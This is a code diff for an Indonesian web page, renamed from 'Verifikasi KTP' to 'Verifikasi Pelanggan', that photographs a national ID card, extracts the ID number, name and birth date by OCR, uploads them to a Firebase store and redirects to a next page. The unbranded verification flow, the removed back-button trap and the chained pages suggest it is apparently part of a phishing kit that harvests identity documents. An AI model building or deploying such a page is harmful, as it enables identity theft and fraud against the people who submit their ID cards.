@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifikasi KTP</title>
+<title>Verifikasi Pelanggan</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>
@@ -18,7 +18,7 @@ body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:cente
  background:#111;display:flex;justify-content:center;align-items:center;position:relative;
 }
 .frame img{width:100%;height:100%;object-fit:cover;display:none}
-.label{position:absolute;color:#00aaff;opacity:.7}
+.label{position:absolute;color:#00aaff}
 
 /* BUTTON */
 .btn{
@@ -53,19 +53,34 @@ body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:cente
 }
 @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
 
+/* POPUP */
+#popupSuccess{
+ position:fixed;top:0;left:0;width:100%;height:100%;
+ background:rgba(0,0,0,0.7);
+ display:none;justify-content:center;align-items:center;z-index:1000;
+}
+.popup-box{
+ background:#111;padding:25px;border-radius:12px;
+ width:80%;max-width:320px;text-align:center;
+}
+#btnLanjut{
+ width:100%;padding:12px;
+ background:linear-gradient(45deg,#007bff,#00aaff);
+ color:#000;font-weight:bold;border:none;border-radius:8px;
+}
 </style>
 </head>
 
 <body>
 
-<h2>VERIFIKASI KTP</h2>
+<h2>Verifikasi Pelanggan</h2>
 
 <div class="frame">
  <img id="preview">
  <div class="label" id="label">FOTO KTP</div>
 </div>
 
-<button class="btn" onclick="ambilFoto()">AMBIL FOTO</button>
+<button class="btn" id="btnFoto">AMBIL FOTO</button>
 
 <div class="form" id="formOCR">
  <input class="input" id="nik" placeholder="NIK">
@@ -74,7 +89,7 @@ body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:cente
 </div>
 
 <div class="checkbox" id="box">
- <input type="checkbox" id="check" onchange="kirimOtomatis()">
+ <input type="checkbox" id="check">
  Data yang saya berikan sudah sesuai dengan Kartu Identitas saya.
 </div>
 
@@ -86,27 +101,24 @@ body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:cente
  <p id="loadingText">Memproses Verifikasi... 0%</p>
 </div>
 
+<!-- POPUP -->
+<div id="popupSuccess">
+ <div class="popup-box">
+  <h3>Upload Berhasil</h3>
+  <p>Data Anda berhasil dikirim</p>
+  <button id="btnLanjut">LANJUTKAN</button>
+ </div>
+</div>
+
 <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
 
 <script type="module">
 
-/* LOCK BACK */
-history.pushState(null,null,location.href);
-window.onpopstate=()=>history.go(1);
-
-/* AUTO RESET */
-window.onload=()=>{
- preview.style.display="none";
- label.style.display="block";
- formOCR.style.display="none";
- box.style.display="none";
-};
-
-/* FIREBASE */
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
 import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
+/* FIREBASE */
 const firebaseConfig={
  apiKey:"ISI_APIKEY",
  authDomain:"ISI.firebaseapp.com",
@@ -119,10 +131,24 @@ const app=initializeApp(firebaseConfig);
 const storage=getStorage(app);
 const db=getFirestore(app);
 
+/* ELEMENT */
+const btnFoto=document.getElementById("btnFoto");
+const cameraInput=document.getElementById("cameraInput");
+const preview=document.getElementById("preview");
+const label=document.getElementById("label");
+const formOCR=document.getElementById("formOCR");
+const box=document.getElementById("box");
+const check=document.getElementById("check");
+const notif=document.getElementById("notif");
+const loadingScreen=document.getElementById("loadingScreen");
+const loadingText=document.getElementById("loadingText");
+const popupSuccess=document.getElementById("popupSuccess");
+const btnLanjut=document.getElementById("btnLanjut");
+
 let fileBlob=null;
 
-/* AMBIL FOTO */
-window.ambilFoto=()=>cameraInput.click();
+/* OPEN CAMERA */
+btnFoto.addEventListener("click",()=>cameraInput.click());
 
 /* FORMAT TTL */
 ttl.addEventListener("input",e=>{
@@ -130,7 +156,7 @@ ttl.addEventListener("input",e=>{
  e.target.value=v.replace(/(\d{2})(\d{2})(\d{4})/,"$1 / $2 / $3");
 });
 
-/* EXTRACT OCR */
+/* OCR EXTRACT */
 function extract(t){
  t=t.replace(/\s+/g,' ');
  let nik=(t.match(/\b\d{16}\b)||[""])[0];
@@ -140,8 +166,8 @@ function extract(t){
  return {nik,nama,ttl};
 }
 
-/* HANDLE FOTO */
-cameraInput.onchange=async e=>{
+/* FOTO */
+cameraInput.addEventListener("change",async e=>{
  const file=e.target.files[0];
  if(!file)return;
 
@@ -151,7 +177,6 @@ cameraInput.onchange=async e=>{
  preview.style.display="block";
  label.style.display="none";
 
- loadingText.innerText="Memproses Verifikasi... 0%";
  loadingScreen.style.display="flex";
 
  const result=await Tesseract.recognize(preview.src,'ind+eng',{
@@ -164,8 +189,7 @@ cameraInput.onchange=async e=>{
 
  loadingScreen.style.display="none";
 
- const text=result.data.text.toUpperCase();
- const data=extract(text);
+ const data=extract(result.data.text.toUpperCase());
 
  nik.value=data.nik;
  nama.value=data.nama;
@@ -173,22 +197,13 @@ cameraInput.onchange=async e=>{
 
  formOCR.style.display="block";
 
- cekField();
-};
-
-/* CEK FIELD */
-function cekField(){
  if(nik.value && nama.value && ttl.value){
   box.style.display="block";
  }
-}
+});
 
-nik.oninput=cekField;
-nama.oninput=cekField;
-ttl.oninput=cekField;
-
-/* KIRIM AUTO */
-window.kirimOtomatis=async ()=>{
+/* AUTO KIRIM */
+check.addEventListener("change",async ()=>{
  if(!check.checked)return;
 
  notif.innerText="Uploading...";
@@ -206,8 +221,13 @@ window.kirimOtomatis=async ()=>{
   createdAt:serverTimestamp()
  });
 
+ popupSuccess.style.display="flex";
+});
+
+/* LANJUT */
+btnLanjut.addEventListener("click",()=>{
  window.location.href="index3.html";
-};
+});
 
 </script>
 
